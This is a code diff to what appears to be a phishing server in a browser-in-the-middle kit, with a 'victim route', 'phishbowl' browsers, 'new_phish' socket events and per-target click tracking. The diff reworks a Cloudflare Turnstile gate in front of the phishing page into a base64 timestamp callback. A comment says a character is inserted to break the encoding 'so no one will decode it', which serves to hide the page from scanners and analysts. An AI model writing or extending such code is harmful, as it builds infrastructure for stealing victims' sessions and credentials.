@@ -69,7 +69,6 @@ fastify.register(fastify_io, {maxHttpBufferSize: 1e11})
 /***************** TURNSTILE CONFIGURATION *****************/
 // Check if Turnstile is enabled
 const turnstile_enabled = config.enable_turnstile;
-let verifiedSessions = new Set(); // Store verified session IDs
 let turnstile_site_key;
 let turnstile_secret_key;
 
@@ -109,36 +108,16 @@ fastify.route({
   }
 })
 
-
-//turnstile verification
-fastify.post('/verify', async (req, reply) => {
-	console.log("FLAG2");
-  // If Turnstile is disabled, reject the request to this path
-  if (!turnstile_enabled) {
-    return reply.type('text/html').send("403")
-  }
-  
-  const token = req.body['cf-turnstile-response'];
-
+// Turnstile verification
+async function verifyCaptcha(token) {
   const response = await got.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     form: {
       secret: turnstile_secret_key,
       response: token
     }
   });
-
-  const result = JSON.parse(response.body);
-
-  if (result.success) {
-    // Verification succeeded, add a session ID to identify the user
-    const sessionId = req.headers['x-session-id'];
-    verifiedSessions.add(sessionId);
-    return reply.redirect('/');
-  } else {
-    return reply.send('Verification failed. Please try again.');
-  }
-});
-
+  return JSON.parse(response.body);
+}
 
 //standard victim route
 fastify.route({
@@ -150,20 +129,38 @@ fastify.route({
     let client_country = req.headers['cf-ipcountry'] || 'N/A';
     let tracking_id = pm ? pm.tacking_id : 'tracking_id'
     let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
-    let sessionId = '';
 
     if(pm){
       ship_logs({"event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url})
     }
-
-    // if turnstile is enabled, check if the session is verified
-    if (turnstile_enabled) {
-      sessionId = req.headers['x-session-id'];
-      if (!verifiedSessions.has(sessionId)) {
-        // Serve the Turnstile page if not verified
-        let stream = fs.createReadStream(__dirname + "/turnstile.html").pipe(replace(/YOUR_SITE_KEY/, turnstile_site_key));;
-        return reply.type('text/html').send(stream);
-      }
+	
+  // if turnstile is enabled, check if the session is verified
+	if (turnstile_enabled) {
+		function serveTurnstilePage() {
+		  let stream = fs.createReadStream(__dirname + "/turnstile.html").pipe(replace(/YOUR_SITE_KEY/, turnstile_site_key));
+		  return reply.type('text/html').send(stream);
+		}
+    // if the callback is not present, serve the turnstile page
+		const callback = req.query.callback;
+		if (!callback) {
+			return serveTurnstilePage();
+		}
+		// Remove index[3] we injected when we served the turnstile result 
+		let decodedCallback = callback.slice(0, 3) + callback.slice(4);
+		try {
+      // decode the callback which now is a value base64 encoded string
+			const decodedData = Buffer.from(decodedCallback, 'base64').toString('utf-8');
+			const [timestamp, status] = decodedData.split(':');
+			// Check if the timestamp is recent (within the last 1 minute)
+			const isRecent = (Date.now() - parseInt(timestamp)) < 60 * 1000;
+			// if the timestamp is not recent or the status is not success, serve the turnstile page
+			if (!isRecent || status !== 'success') {
+				return serveTurnstilePage();
+			}
+		} catch (error) {
+			console.error('[!] Error decoding turnstile callback:', error);
+			return serveTurnstilePage();
+		}
     }
 
     console.log('[>] Client Connected:', client_ip, 'From:', client_country)
@@ -444,6 +441,7 @@ fastify.ready(async function(err){
   browsers.push(empty_phishbowl)
   fastify.io.on('connect', function(socket){
     console.info('[>] Socket Connected!', socket.id)
+	
     socket.on('new_broadcast', async function(browser_id){
       // Send TURN servers to the client-side
       if (turnServers) {
@@ -459,6 +457,19 @@ fastify.ready(async function(err){
         }
       })
     })
+	
+    // New CAPTCHA verification handlers
+    socket.on('verifyCaptcha', async (token) => {
+	  const result = await verifyCaptcha(token);
+	  const timestamp = Date.now();
+	  const successValue = result.success ? 'success' : 'failed';
+	  const dataToEncode = `${timestamp}:${successValue}`;
+	  let encodedData = Buffer.from(dataToEncode).toString('base64');
+	  // Insert 'p' at index 3 - break the base64 so no one will decode it
+    encodedData = encodedData.slice(0, 3) + 'p' + encodedData.slice(3);
+	  socket.emit('captchaResult', encodedData);
+	});
+	
     socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
       // Send TURN servers to the client-side
       if (turnServers) {
